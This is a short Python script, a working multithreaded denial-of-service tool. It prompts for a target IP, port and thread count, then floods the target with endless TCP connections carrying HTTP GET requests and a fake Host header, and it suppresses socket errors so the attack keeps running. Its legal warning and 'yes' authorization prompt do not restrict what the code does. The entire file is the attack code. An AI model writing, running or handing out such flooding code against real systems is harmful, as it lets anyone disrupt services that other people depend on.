import socket
import threading
import sys

# Legal Warning
print("WARNING: This tool is intended for educational purposes and authorized stress testing only.")
print("Using this tool to attack networks without permission is illegal and may result in severe penalties.")
print("Proceed only if you have explicit permission from the target network owner.")
print()

# Ask the user to confirm they have authorization
authorization = input("Do you have permission to perform this attack on the target network? (yes/no): ").strip().lower()

if authorization != 'yes':
    print("You must have explicit permission to perform this attack. Exiting.")
    sys.exit()

# Information needed for the attack
target_IP = str(input('Type in the IP you want to DOS: '))
thread_num = int(input('How many Threads do you want to use? '))
port = int(input('Port to target? '))
fake_ip = '453.53.2.143'

# Initialize a global counter for requests
request_counter = 0
request_lock = threading.Lock()

def attack():
    global request_counter
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_IP, port))
            s.sendto(("GET /" + target_IP + " HTTP/1.1\r\n").encode('ascii'), (target_IP, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_IP, port))
            s.close()

            # Update and print the request counter safely using a lock
            with request_lock:
                request_counter += 1
                if request_counter % 100 == 0:  # Print every 100 requests
                    print(f"Requests sent: {request_counter}")

        except socket.error:
            pass  # Ignore socket errors to keep the attack running

# Create the threads and start the attack
for i in range(thread_num):
    thread = threading.Thread(target=attack)
    thread.start()
